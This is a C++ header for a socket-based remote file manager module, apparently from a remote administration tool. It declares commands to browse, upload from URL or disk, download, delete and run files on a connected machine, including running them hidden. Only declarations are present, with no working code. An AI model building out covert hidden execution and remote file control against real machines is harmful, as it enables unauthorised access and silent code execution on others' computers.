#pragma once
#include "EventHandler.h"

#define FILE_MANAGER	('F'|('M'<<8)|('G')<<16|('R'<<24))
#define FILE_MGR_CHDIR			0x00a1
#define FILE_MGR_CHDIR_RET		0x00a2
//NewDir.
#define FILE_MGR_GETLIST		0x00a3
#define FILE_MGR_GETLIST_RET	0x00a4

#define FILE_MGR_UP				0x00a5
#define FILE_MGR_REFRESH		0x01a6
#define FILE_MGR_SEARCH			0x01a7	



#define FILE_MGR_UPLOADFROMDISK	0x00a6
#define FILE_MGR_UPLOADFRURL	0x00a7

#define FILE_MGR_DOWNLOAD		0x00a8

#define FILE_MGR_RUNFILE_NORMAL	0x00a9
#define FILE_MGR_RUNFILE_HIDE	0x00aa
//
#define FILE_MGR_NEWFOLDER		0x00ab
#define FILE_MGR_RENAME			0x00ac
#define FILE_MGR_DELETE			0x00ad
#define FILE_MGR_COPY			0x00ae
#define FILE_MGR_CUT			0x00af
#define FILE_MGR_PASTE			0x00b0


#define FILE_MGR_PREV_RENAME			0x1105

#define FILE_MGR_NEW_FOLDER_SUCCESS		(0x1106)

#define FILE_MGR_ERROR					(0x1107)


//notify message
#define WM_FMDLG_CHDIR					(WM_USER + 133)
#define WM_FMDLG_LIST					(WM_USER + 134)
#define WM_FMDLG_TEST					(WM_USER + 135)
#define WM_FMDLG_NEWFOLDER_SUCCESS		(WM_USER + 140)
#define WM_FMDLG_ERROR					(WM_USER + 141)


class CFileManagerSrv :
	public CEventHandler
{
public:
	void OnClose();					//当socket断开的时候调用这个函数
	void OnOpen();					//当socket连接的时候调用这个函数

	//有数据到达的时候调用这两个函数.
	void OnEvent(UINT32 e, BYTE *lpData, UINT32 Size);;

	void OnChangeDirRet(DWORD dwRead,char*buffer);
	void OnGetListRet(DWORD dwRead, char*buffer);

	void Echo(WORD Msg);

	void Up();
	void Refresh();
	void NewFolder();
	void Rename(const TCHAR *szNames);
	void ChDir(const TCHAR *szNewDir);
	void Search();

	void Delete(const TCHAR *szFileList);
	void Copy(const TCHAR *szFileList);
	void Cut(const TCHAR *szFileList);
	void Paste();

	void UploadFromUrl(const TCHAR *szUrl);
	
	void UploadFromDisk(const TCHAR * SrcDir, const TCHAR *szFileList);
	void Download(const TCHAR * DestDir, const TCHAR *szFileList);

	void RunFileNormal(const TCHAR *szFileList);
	void RunFileHide(const TCHAR *szFileList);

	CFileManagerSrv(CClient*pClient);
	~CFileManagerSrv();
};

